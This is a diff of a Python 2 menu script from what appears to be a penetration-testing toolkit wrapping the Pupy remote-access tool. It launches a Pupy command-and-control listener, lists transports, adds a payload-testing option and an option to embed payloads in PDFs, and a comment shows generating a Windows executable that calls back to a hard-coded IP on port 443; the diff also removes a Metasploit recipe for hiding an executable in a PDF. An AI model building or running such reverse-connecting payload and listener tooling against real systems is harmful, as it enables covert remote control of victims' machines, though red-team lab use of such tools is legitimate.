@@ -25,7 +25,28 @@ print 'Please raise a issue on GitHub if there is any major bugs'
 # print 'Plus, you can still have it interface with Metasploit if you wish'
 
 
-
+transport_Dict = {
+    '1': 'obfs3',
+    '2': 'udp',
+    '3': 'http',
+    '4': 'tcp_cleartext',
+    '5': 'rsa',
+    '6': 'ssl',
+    '7': 'udp_cleartext',
+    '8': 'scramblesuit',
+    '9': 'ssl_rsa'
+}
+transport_List = [
+    '\n\t1 obfs3',
+    '2 udp',
+    '3 http',
+    '4 tcp_cleartext',
+    '5 rsa',
+    '6 ssl',
+    '7 udp_cleartext',
+    '8 scramblesuit',
+    '9 ssl_rsa'
+]
 
 def generate_pupy_payload():
     # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
@@ -47,33 +68,44 @@ def server_pupy():
     if opt_Choice == "0":
         main()
     elif opt_Choice == "1":
-        os.system('sudo chmod 777 /root/ArmsCommander')
-        os.system('sudo /root/ArmsCommander/pupy_server_startup.sh')
+
+        # ask for system-level root user permissions
+        # # change to pupysh.py directory
+        # os.chdir('/root/pupy/pupy')
+        # the sudo su command was causing problems. Had to take it out
+        # modify the autostart script for all users
+        os.system('sudo chmod 777 /root/ArmsCommander/payloads/*')
+        os.chdir('/root/ArmsCommander/payloads/')
+        # execute the autostart script that was created during payload generation
+        os.system('sudo /root/ArmsCommander/payloads/pupy_server_startup.sh')
     elif opt_Choice == "2":
+        print ("\n\t".join(transport_List))
         server_pupy_transport = str(raw_input("Enter your TRANSPORT (Protocol): "))
+        transport_Chosen = transport_Dict[server_pupy_transport]
         server_pupy_port = str(raw_input("Enter your PORT: "))
-        cmd_String = "python /root/pupy/pupy/pupysh.py -t %s -p %s" % (server_pupy_transport, server_pupy_port)
+
+        # we are changing the code since we found a new bug in a previous version of Pupy, where the commands will ONLY work without error if..
+        # if you change to the directory. It's weird
+
+        # change to proper directory
+        # execute command with pupysh.py in same directory
+        cmd_String = "python /root/pupy/pupy/pupysh.py -t %s -p %s" % (transport_Chosen, server_pupy_port)
         print cmd_String
         os.system(cmd_String)
-    # elif opt_Choice == "INSTALL": # all this does is define how the execution is run
-    #     os.system('chmod 777 /root/ArmsCommander/remoteexploits/pupy_installer_firstattempt.sh')
-    #     os.system('cp -r /root/ArmsCommander/remoteexploits/pupy_installer_firstattempt.sh /root')
-    #     os.system('cd /root')
-    #     os.system('/root/pupy_installer_firstattempt.sh') # runs the script
+
 
     else:
         print colored('You have entered a invalid option','red','on_white')
         server_pupy()
     return
-# search embed
-# use exploit/windows/fileformat/adobe_pdf_embedded_exe
-# options
-# set EXENAME /root/pupyx86.exe
-# set INFILENAME /root/Desktop/11F19536X.pdf
-# run
+
 
 def embed_pdf():
     os.system('python /root/ArmsCommander/remoteexploits/embed_pdf_pupy.py')
+    return
+
+def tester():
+    os.system('python /root/ArmsCommander/remoteexploits/testerPrototype2.py')
     return
 
 def main():
@@ -81,7 +113,8 @@ def main():
         '\n\t#1. Run Pupy Payload Generator',
         '#2. Run Pupy Listener/Server',
         '#3. Embed the payload into a PDF when run',
-        '#INSTALL. Attempt to run the Pupy Installer, please be in your /root folder FIRST (not guaranteed to work)'
+        '#INSTALL. Attempt to run the Pupy Installer, please be in your /root folder FIRST (not guaranteed to work)',
+        '#TESTER. Make a copy of each payload type, for testing purposes (to see if they work in a pentest lab)'
     ]
 
     root_directory = '/root'
@@ -111,6 +144,9 @@ def main():
         os.chdir(pupy_module_dir)
         os.system('pip install -r requirements.txt')
         print 'Installation complete. Try it out in ArmsCommander'
+    elif opt_Choice == "TESTER":
+        os.system('clear')
+        tester()
     else:
         print colored('You have entered a invalid option','red','on_white')
         main()
